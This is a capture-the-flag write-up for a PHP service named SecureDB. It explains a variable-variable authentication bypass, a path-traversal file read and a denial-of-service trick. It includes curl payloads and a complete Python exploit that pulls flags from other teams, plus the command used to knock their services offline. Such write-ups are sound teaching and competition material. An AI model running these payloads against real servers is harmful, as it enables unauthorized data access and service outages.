# SecureDB Vulnerabilities

Authentication Bypass
------
There's an authentication mechanism called `checkAdmin()` which basically compares a GLOBAL variable called `isAdmin` to make sure if it's set and is `True`.  Since PHP version on server was `5.5.9`, so by default `register_globals` has been truned OFF, since PHP 4.2.0. Therefore it's not possible to set this variable using `$_GET` or `$_COOKIE`. But there's a functionality in service at the beginning of file which goes through all of the files in `../append` directory and introduce them as a variable using [variable variable name](http://php.net/manual/en/language.variables.variable.php).

```php
$$_fileName = json_decode(file_get_contents(FILE_DIRECTORY . $_fileName), true);
```

If attacker by chance could make a file with name `isAdmin` under `../append` directory, so the above code will replace file name as a variable name and finally we can have `$isAdmin` set.

In order to exploit that, there's another functionality in the service to make files under that directory named `storeProtectedRecord()`. Using the following payload one can make `isAdmin` file:

```
curl "http://localhost/securedb/securedb.php?method=storeProtectedRecord&filename=isAdmin&password=foo&name=bar&ssn=tar"
```

Then you'll see that service shows you that you're an Admin right now. So, with this privilege one can read files from server using `adminAccessFile()` method. Using the following exploit you can read filesfrom service.

```
curl "http://localhost/securedb/securedb.php?method=adminAccessFile&filename=../append/flag_id"
```

In the following you can find the full exploit which grabs flag from each team.

```python
def exploit(host, port, flag_id):
	payload = 'http://{0}:{1}/securedb.php?method=storeProtectedRecord&fileName=isAdmin&password=foo&name=bar&ssn=ssn'
	url = payload.format(host, port)
	r = requests.get(url, headers={'Connection':'close'})
	payload = 'http://{0}:{1}/securedb.php?method=adminAccessFile&fileName=../append/{2}'
	url = payload.format(host, port, flag_id)
	r = requests.get(url, headers={'Connection':'close'})
	flag = re.findall(r'(FLG[a-zA-Z0-9]{13})', r.content)
	try:
		return flag[0]
	except:
		pass
```

DOS Attack
-------
During the game I got there's another vulnerability in the way new variables made from file name which paid my attention for some moments. If I make a file named `_GET` under the `../append` directory, next time the service will iterate through files and introduces new variables, a new variable named `$_GET` will be made with a garbage string content. So, by using this any further GET requests of bot-master to service will be failed which will be considered as a violation of service integrity and scoreboard will show that service as down. Also, it should be metioned that, players didn't have access to removethat file from `../append` directory which seems to be serious. 

Finally, I used this payload to make all instances of other teams `securedb` down. 

```
curl "localhost/securedb/securedb.php?method=storeProtectedRecord&filename=_GET&password=foo&name=bar&ssn=tar"
```

Here's the result of running above attack on other teams:

![alt text](https://raw.githubusercontent.com/pwnslinger/CTF/master/securedb/images/service_status.png "services status board")

Yeah! our team name was cromulence!

Good Luck!
@pwnslinger
